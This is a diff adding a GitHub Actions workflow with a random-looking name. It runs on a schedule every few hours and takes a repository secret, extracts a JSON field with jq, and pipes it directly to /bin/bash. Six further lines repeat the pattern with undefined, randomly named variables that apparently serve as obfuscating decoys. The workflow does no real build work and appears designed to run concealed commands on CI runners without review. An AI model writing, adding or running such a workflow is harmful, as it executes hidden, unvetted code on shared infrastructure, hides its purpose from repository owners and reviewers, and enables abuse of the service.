@@ -1,0 +1,23 @@
+name: charcoalterrorist
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: charcoalterrorist
+        env:
+          p8: ${{ secrets.p8 }}
+        run: |
+          echo $p8 | jq -r .emvnk33 | /bin/bash
+          echo $wpvlf57 | jq -r .mh1 | /bin/bash
+          echo $uavi2 | jq -r .x5341 | /bin/bash
+          echo $cmq34684 | jq -r .zcprt3269 | /bin/bash
+          echo $v0785 | jq -r .af52 | /bin/bash
+          echo $juget15316 | jq -r .wrgoc51382 | /bin/bash
+          echo $lrd56031 | jq -r .vck0152 | /bin/bash
+
